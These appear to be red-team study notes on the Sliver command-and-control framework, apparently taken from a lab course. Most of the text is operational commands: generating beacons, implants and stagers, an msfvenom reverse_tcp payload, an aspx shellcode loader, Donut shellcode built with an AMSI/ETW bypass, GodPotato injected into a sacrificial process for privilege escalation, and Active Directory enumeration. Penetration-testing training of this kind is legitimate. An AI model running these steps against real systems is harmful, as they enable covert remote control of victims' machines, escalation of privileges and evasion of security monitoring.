## What is?
Sliver is a new C2 framework based on Golang, that can be used as *Command Control* and perform post-exploitation tasks.

## How to install?
The easiest is to download and use the pre-compiled binaries for both the agent & server from the GitHub page: [Releases · BishopFox/sliver (github.com)](https://github.com/BishopFox/sliver/releases)
```shell-session
//Getting client
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
chmod +x sliver-client_linux

//Gettin server
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x sliver-server_linux
```

## Preface
Before first use a profile is needed to be created this can be seen as "account". This is because the framework allow a multi-user and simultaneous use.
```shell-session
[server] sliver > new-operator -n student -l 10.10.14.193
```
And you need to enable the "multiplayer" mode in order to allow a connection back(even if only one user).
```shell-session
[server] sliver > multiplayer
```

## Basic use
When you have a created a profile that will take care of the connection back to the main server you can login.
```shell-session
//Upload the client to the victim and make it executable(in case of LINUX!)

//Execute the client with the connection profile
./sliver-client_linux import student_10.10.14.193.cfg 

2023/09/27 11:45:03 Saved new client config to: /home/htb-ac-8414/.sliver-client/configs/student_10.10.14.193.cfg
```
The connection profile is important, otherwise the client doesn't know how to talk back to the framework server.

## Armory
Armory will allow you to manage all the plugins that the framework support, to name fews...
( `Rubeus`, `Seatbelt`, `sharperists`, `sharpsh`, `sharpup`, `c2tc-domaininfo`, `certify`, `inline-execute-assembly`, `c2tc-kerberoast`, `nanodump`, `sharpview`, `bof-roast`).
```shell-session
//Fetch the list of modules
sliver > armory

//Install one
sliver > armory install seatbelt

//Install them all
sliver > armory install all
```

## Implant, Bacons & more...
This paragraph is about the "attack" phase of the tool, and how it iterate with the framework on the backend.
- **Implants** : we can vulgarly call them the "payloads" as it can be generated for Windows/Linux/Mac and it allows the client catch back a session to the framework. This can operate on different protocol and can perform different obfuscations. It can operate both on *Beacon* and *Session* mode.
- **Beacon mode** : The `beacon` mode operates in intervals, resulting in the execution of commands at a set period.
- **Session mode** : The `session` mode enables the ability to have immediate execution of commands by the operator. The beacon mode has its benefits whenever it comes to an actual red team engagement, as it won't streamline the traffic/commands at a constant pace, which might alert the blue teams.
### Beacon
You can generate a bacon non-obfuscated with a callback interval of one minute(how often it reports back to the main server). **It is worth mentioning that skipping symbols will make it very easily detectable!**
```shell-session
sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
```
Or you can obfuscate it.
```shell-session
sliver > generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows
```
### Listeners
This is extremely important as without a listener a Implant cannot connect/talk-back.
```shell-session
sliver > http --lport 8088
```
By default if omitted the port used by the listener is **31337**.

### Named pipes
[Named pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes) is a concept for creating communication between a server and a client; this can be a process on computer A and a process on computer B. Each pipe has a unique name following the format of `\\ServerName\pipe\PipeName` or `\\.\pipe\PipeName`.
<font color="#c00000">In `Sliver`, named pipes are primarily used for pivoting on Windows as it is the only supported operating system at the time of writing. </font>Generating a pivot listener follows a different approach, requiring an established session on a target. A pivot listener is close to a bind shell; we are starting a pivot listener on Host A, and from Host B, we will connect to Host A, establishing a chain of communication between the two hosts. This method is used in environments where traffic routing is quite restricted.
Starting the pivot listener via named pipe.
```shell-session
[server] sliver (http_beacon) > pivots named-pipe --bind academy
```
And now you can generate a pivot implant.
```shell-session
sliver > generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols
```

### Stagers
You can also opt for stagers, where the initial payload will be much smaller(less prone to detection), as will act as a "stager"(get the initial connection to the server and from there download the real payload while injecting into memory).
```shell-session
//Generate profile
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb
[*] Saved new implant profile htb

//Generate the stage-listener
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb
[*] No builds found for profile htb, generating a new one
[*] Sliver name for profile htb: HIGH_RISER
[*] Job 2 (tcp) started

//Gereate the listener
sliver > http -L 10.10.14.62 -l 8088 --website delivery
[*] Starting HTTP :8088 listener ...
[*] Successfully started job #3

//Generate the stager shellcode
sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
[*] Sliver implant stager saved to: /home/htb-ac590/staged.txt
```
In this example I was required to use a aspx based payload, and we can use msfvenom to generate the final payload.
```shell-session
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=8088 -f aspx > sliver.aspx
```
Next, we would need to take the generated payload in `staged.txt` and change the payload in the `Page_Load` function. The `byte[]` array will be defined with a different name;<font color="#c00000"> it is pretty important to put the `new byte[511]`</font> array from `staged.txt` into the `byte[] mO0UY` declaration in the example below in the `sliver.aspx` file.
```aspx
    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] mO0UY = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
        0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
        0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
        0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x41,0x51,0x66,
        0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01
<SNIP>
```
After upload and klick by the victim we can check the running sessions.
```shell-session
sliver > sessions

 ID         Transport   Remote Address         Hostname   Username   Operating System   Health  
========== =========== ====================== ========== ========== ================== =========
 06ff8ed9   http(s)     10.129.205.234:49699   web01      <err>      windows/amd64      [ALIVE] 
```
And chose it!
```shell-session

sliver > use 06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3
[*] Active session HIGH_RISER (06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3)
sliver (HIGH_RISER) > info
```

## Commands
A list of basic commands....
```shell-session
//Upload a file to remote session
sliver (http-session) > upload academy.txt C:\\Users\\eric\\Desktop\\academy.txt

//Download a file from remote session
sliver (http-session) > download Pictures
```
You can also execute assemblies(*basically run exe's remotely in the same session*) without the need to upload them. By default the shell will spawn a notepad.exe in order to hide the assembly.
```shell-session
sliver (http-session) > execute-assembly Seatbelt.exe -group=system
```
### Donut
Donut is a extra module that can be used to convert exe's in shellcode that can be injected directly into sliver memory, which makes is much more tedious to find. 
We must first setup the application on our machine.
```shell-session
git clone http://github.com/thewover/donut.git
cd donut
make -f Makefile
```
Generate(**http** or **mtls**) and upload a beacon on the victim.
```shell-session
sliver (HIGH_RISER) > generate beacon --http 10.10.14.62:9002 --skip-symbols -N http-beacon

//Upload to the victim
upload http-beacon.exe C:\\Windows\\Tasks\\http-beacon.exe

//Setup a listener to catch back
sliver (HIGH_RISER) > http --lhost 10.10.14.62 --lport 9002
```
To generate the binary shellcode using `Donut`, we are going to be using the arguments `-i` choosing the file to be executed in memory,`-a 2` responsible for choosing the architecture (2 = amd64), the `-b 2` responsible for bypassing AMSI/WLDP/ETW (2 = Abort on fail), `-p` followed by the arguments that are going to be run from `GodPotato` and the `-o` to specify the output directory and the name of the shellcode.
```shell-session
./donut -i /home/htb-ac590/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac590/godpotato.bin
```
Now we need to create a sacrificial process(write down the **PID**, you will need it later).
```shell-session
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
```
With the PID from the sacrificial process we can execute the payload.
```shell-session
sliver (HIGH_RISER) > execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
```
## Powerview
It is possible to run natively Powerview via the execute assembly to sideload it from your machine.
```shell-session
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
```
## Certify
it is possible to use the native module(remember to install it from armory) to iterate with ADCS.
```shell-session
sliver (http-beacon) > certify -- find 
```
